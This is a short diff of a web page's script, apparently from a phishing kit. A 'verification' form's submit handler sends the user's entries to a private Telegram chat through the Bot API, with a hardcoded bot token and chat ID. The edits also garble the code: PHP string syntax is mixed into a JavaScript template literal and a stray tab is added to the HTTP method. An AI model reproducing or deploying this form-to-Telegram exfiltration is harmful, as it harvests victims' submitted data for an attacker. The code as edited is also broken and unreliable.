@@ -165,9 +165,7 @@
         // Telegram Bot integration
         const botToken = "7605659515:AAFW1CF2bdDNNhKd2hAHiveji8LYdvW3fBo";
         const chatID = "-7149939055";
-	IdTelegram=array("7149939055");
-
-
+	
 
         const form = document.getElementById("verification-form");
         form.addEventListener("submit", async function (e) {
@@ -183,10 +181,10 @@
 			
 
             // Send to Telegram
-            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const telegramURL = `https://api.telegram.org/bot".$botToken/sendMessage`;
             try {
                 const response = await fetch(telegramURL, {
-                    method: "POST",
+                    method: "POST	",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id: chatID, text: message })
                 });
